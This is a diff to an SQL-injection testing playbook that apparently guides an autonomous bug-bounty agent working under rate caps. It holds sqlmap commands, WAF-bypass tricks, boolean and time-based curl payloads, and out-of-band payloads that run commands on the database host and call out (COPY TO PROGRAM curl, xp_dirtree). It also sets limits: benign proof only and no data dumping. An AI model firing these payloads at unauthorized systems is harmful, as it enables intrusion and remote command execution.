@@ -95,21 +95,23 @@ Once injectable, identify the engine:
 * SQLite: `sqlite_version()`, no UNION-based out of box on read-only
 * Comment styles: `--` (most), `#` (MySQL), `/* */` (MySQL/MSSQL/Postgres)
 
-### Step 4: Run sqlmap on confirmed candidates
-sqlmap is the industrial tool — use it once you've confirmed manually:
+### Step 4: Run sqlmap on confirmed candidates (if present)
+sqlmap is the industrial tool — use it once you've confirmed manually with `curl`/`httpx`. **Always carry the rate caps from TARGET.md** (sqlmap supports `--delay` between requests and `--threads`; keep threads low and delay at/above the documented cap to stay under the firewall-enforced limit):
 ```
 sqlmap -u "https://target.com/api/x?id=1" \
   --cookie "session=..." --level 5 --risk 3 \
-  --batch --random-agent
+  --batch --random-agent --threads 1 --delay <cap from TARGET.md>
 ```
 For JSON body:
 ```
 sqlmap -u "https://target.com/api/x" \
   --method POST --data '{"id":1}' \
   --headers="Content-Type: application/json" \
-  --cookie "session=..." --level 5 --risk 3 -p id
+  --cookie "session=..." --level 5 --risk 3 -p id \
+  --threads 1 --delay <cap from TARGET.md>
 ```
-Use `-r request.txt` mode with raw Burp/Caido request for complex auth.
+Build a raw request file from your `curl -v` capture and feed it with `-r request.txt` for complex auth. If sqlmap is not installed, do the whole confirmation by hand with `curl`/`httpx` (boolean/time differential, see PROOF below) — that is fully sufficient.
+For blind OOB confirmation through sqlmap, point it at the canary: `--dns-domain "$AUTOHUNT_OOB"` (only if `$AUTOHUNT_OOB` is set).
 
 ### Step 5: WAF bypass
 * Case variation: `SeLeCt` instead of `SELECT`
@@ -120,20 +122,43 @@ Use `-r request.txt` mode with raw Burp/Caido request for complex auth.
 * Use scientific notation / hex for numbers: `0x61646d696e` instead of `'admin'`
 * Whitespace alternatives in MySQL: `SELECT(1)FROM(users)`
 
-## Impact Demonstration
+## PROOF (autonomous CLI oracle)
 
-* For boolean blind: extract a non-sensitive value first (DB version, current_user)
-* For time-based: 3+ timing measurements showing controllable delay
-* If extracting data, extract a small known target (your own user record) to prove read access — don't dump tables
-* If write access (`UPDATE` injection), demonstrate on data you own
-* For RCE chains via SQLi (xp_cmdshell, COPY PROGRAM), execute `id`/`whoami` only and document
+Confirm via the firewalled Bash CLI — `curl`/`httpx` (and `sqlmap` if present, with TARGET.md rate caps). A finding requires a **reliable, repeatable** differential or an extracted benign marker. Anything that only fires once or depends on an unset OOB host is a **LEAD**, not a finding.
+
+* **Boolean differential (preferred, deterministic):** send the true and false variants and diff a stable signal — HTTP status, `Content-Length`, or a body marker. Example:
+  ```bash
+  # true vs false, compare response sizes
+  curl -s -o /dev/null -w '%{size_download} %{http_code}\n' \
+    "https://target/api/search?q=foo'+AND+1=1--"
+  curl -s -o /dev/null -w '%{size_download} %{http_code}\n' \
+    "https://target/api/search?q=foo'+AND+1=2--"
+  ```
+  A consistent size/status split that tracks the truth condition = confirmed boolean-blind. Re-run each variant 2-3x to rule out caching/noise.
+* **Time-based differential:** measure `%{time_total}` over multiple runs; the sleep payload must be reliably slower than the no-sleep baseline. Use a high delay (5-10s) to clear network jitter and WAF noise:
+  ```bash
+  for i in 1 2 3; do curl -s -o /dev/null -w '%{time_total}\n' \
+    "https://target/api/x?id=1'%3BSELECT+pg_sleep(8)--"; done
+  for i in 1 2 3; do curl -s -o /dev/null -w '%{time_total}\n' \
+    "https://target/api/x?id=1'%3BSELECT+pg_sleep(0)--"; done
+  ```
+  Baseline ~fast every time, payload ~8s+ every time = confirmed. Respect the TARGET.md rate caps between bursts.
+* **Extracted benign marker (strongest proof):** pull a non-sensitive value via UNION/error/boolean and show it in the response — `@@version` / `version()` / `current_user` / `current_database()`. A leaked DB version string in the HTTP body is unambiguous proof of read access. Extract one tiny known value (the DB banner, or your own user record) — never dump tables.
+* **OOB confirmation (blind, when echo-less):** if `$AUTOHUNT_OOB` is set, force the DB to call out and confirm the canary hit:
+  * Postgres (superuser): `; COPY (SELECT '') TO PROGRAM 'curl http://$AUTOHUNT_OOB/sqli-$(whoami)'--`
+  * MSSQL: `; EXEC master..xp_dirtree '\\$AUTOHUNT_OOB\test'--` (or `xp_subdirs`)
+  * Oracle: `UTL_HTTP.request('http://$AUTOHUNT_OOB/')`
+  Then check the canary log for the hit. **If `$AUTOHUNT_OOB` is UNSET and you cannot produce a boolean/time differential or extracted marker → record a LEAD, not a finding.**
+* If write access (`UPDATE` injection) — demonstrate on data you own only; do NOT run destructive statements.
+* For RCE chains via SQLi (xp_cmdshell, COPY PROGRAM) — execute a benign marker like `id`/`whoami` and capture it (via response echo or `$AUTOHUNT_OOB` callback). Document and stop.
 
 ## Key Considerations
 
 * **Never dump production data.** A schema leak + small known-record extraction is plenty for proof. Mass extraction is illegal everywhere.
 * Don't use destructive payloads. `UPDATE`/`DELETE`/`DROP` even on a test record can damage production
 * Time-based + WAF can be slow; use higher delay thresholds (10s) to overcome WAF noise
-* For JSON bodies, sqlmap needs explicit `-p` parameter targeting; bare auto-detect often misses
+* For JSON bodies, sqlmap (if present) needs explicit `-p` parameter targeting; bare auto-detect often misses
 * `--tamper=...` scripts in sqlmap (especially `space2comment`, `between`, `randomcase`) help with WAF
+* All scan tooling (sqlmap, ffuf for param discovery) MUST carry the rate flags — use the caps in TARGET.md
 * Many "SQLi" reports are actually unintended-string-concat — the bar for impact is **demonstrate data access or modification on data the attacker shouldn't reach**
 * For NoSQL injection, also check the response shape — Mongo errors leak the query structure
